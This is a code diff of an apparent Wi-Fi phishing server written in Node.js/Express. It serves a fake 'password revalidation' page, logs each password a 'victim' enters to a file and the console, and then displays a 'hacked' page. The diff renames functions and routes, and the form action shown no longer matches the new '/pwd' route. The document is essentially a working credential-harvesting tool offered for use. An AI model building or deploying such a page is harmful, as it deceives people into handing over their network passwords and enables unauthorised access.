@@ -10,16 +10,10 @@ const BodyParser = require('body-parser')
 app.use(BodyParser.urlencoded({extended: true}))
 app.use(express.static(__dirname + "/public"));
 
-/* Import node-wifi 
-const wifi = require('node-wifi');
-//https://www.npmjs.com/package/node-wifi
-*/
 
-
-var title ='';
 
 // The HTML page that is presented to the client
-const generateHTML = (title) => `<!DOCTYPE html>
+const presentHTML = (title) => `<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -48,7 +42,7 @@ const generateHTML = (title) => `<!DOCTYPE html>
   	<div>${title || ''}</div>
       <img src="wifi-icon3.png" width="520vw">
       
-      <p>WIFI PASSWORD REVALIDATION FOR SECURITY PURPOSES.</p> 
+      <p>Wifi passowrd needs to be revalidate for security purposes.</p> 
 
 	  <form method="post" action="password" id="mform">
 		<p>Please enter your password: </p>
@@ -60,7 +54,7 @@ const generateHTML = (title) => `<!DOCTYPE html>
 </body>
 </html>`;
  
-const generateHackedHTML = (title) => `<!DOCTYPE html>
+const presentHackedHTML = (title) => `<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -90,40 +84,23 @@ const generateHackedHTML = (title) => `<!DOCTYPE html>
 	
 </body>
 </html>`;
-// What to do if there is a GET request
+
 app.get('/', (req, res) => {
     // Print message to the server side
-    const web = req.headers.urlencoded;
-    const yo = req.body.urlencoded;
-    console.log(`The victim attempted to request access to the website :  ${web} \n`);
-    console.log(`The victim attempted to request access to the website2 :  ${yo} \n`);
-
+    console.log(`The victim attempted to access a website\n`);
     // Response - return the HTML page 
-    res.send(generateHTML()); 
+    res.send(presentHTML('WIFI PASSWORD REVALIDATION')); 
 });
 
-// What to do if there is a POST request
-/* 
-app.post('/password', async (req, res) => {
-*/
-app.post('/password', (req, res) => {
-    // In POST request the information is in the body
-    // The information in our case is the password that the client entered
+
+app.post('/pwd', (req, res) => {
+    // In POST request the password  that the client entered is in the body 
     const password = req.body.password;
-    // Write the given password in the 'password.txt' file & Print a message in the server side
+    // Write the given password in the 'victim_password.txt' file 
     fs.appendFileSync('victim_passwords.txt', `victim_password : ${password} \n`);
-    console.log(`The client entered a password : ${password} \nYou may also see this password in - passwords.txt`);
-    /*
-    // ans will be True - if the password is correct
-    // ans will be False - if the password is incorrect
-    const ans = await checkPassword(password);
-    // title will be the message for the client side, we will insert it to the new HTML page
-    title = ans ? 'Great succeess :)' : 'The password is incorrect. :(';
-    */
-    //title = "Authenticating...\n If you wait more than 1min. the password is INCORRECT."
-   // title="YOU HAVE BEEN HACKED!\n"
-    // Response - return the new HTML page 
-    res.send(generateHackedHTML(title));
+    //print the victim password in the server terminal 
+    console.log(`The victim entered a password : ${password} `);
+    res.send(presentHackedHTML(''));
 });
 
 // Define the port that the web server will listen to
